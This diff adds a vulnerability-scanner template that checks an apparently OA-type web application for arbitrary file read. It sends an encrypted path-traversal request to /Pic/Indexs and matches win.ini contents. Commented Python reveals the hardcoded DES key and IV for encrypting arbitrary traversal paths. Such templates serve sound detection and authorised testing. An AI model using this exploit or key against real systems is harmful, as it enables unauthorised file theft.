@@ -1,0 +1,52 @@
+id: Office365-Indexs-fileread
+
+info:
+  name: Office365-Indexs-fileread
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"[fonts]")
+
+
+# from Crypto.Cipher import DES
+# import base64
+
+# def enc(plain_text):
+#     key = b'\x66\x10\x5d\x9c\x4e\x04\xda\x20'
+#     iv = b'\x37\x67\xf6\x4f\x24\x63\xa7\x03'
+
+#     # 将明文转换为字节数组
+#     plain_bytes = plain_text.encode('utf-8')
+
+#     # 创建 DES 加密器
+#     cipher = DES.new(key, DES.MODE_CBC, iv)
+
+#     # 计算加密后的数据长度，并进行填充
+#     block_size = 8
+#     padded_text = plain_bytes + (block_size - len(plain_bytes) % block_size) * chr(block_size - len(plain_bytes) % block_size).encode()
+
+#     # 执行加密
+#     encrypted_bytes = cipher.encrypt(padded_text)
+
+#     # 将加密后的数据转换为 Base64 字符串
+#     encrypted_text = base64.b64encode(encrypted_bytes).decode('utf-8')
+
+#     return encrypted_text + "09"
+
+# # 示例
+# result = enc("/../../Windows/win.ini")
+# print(result)
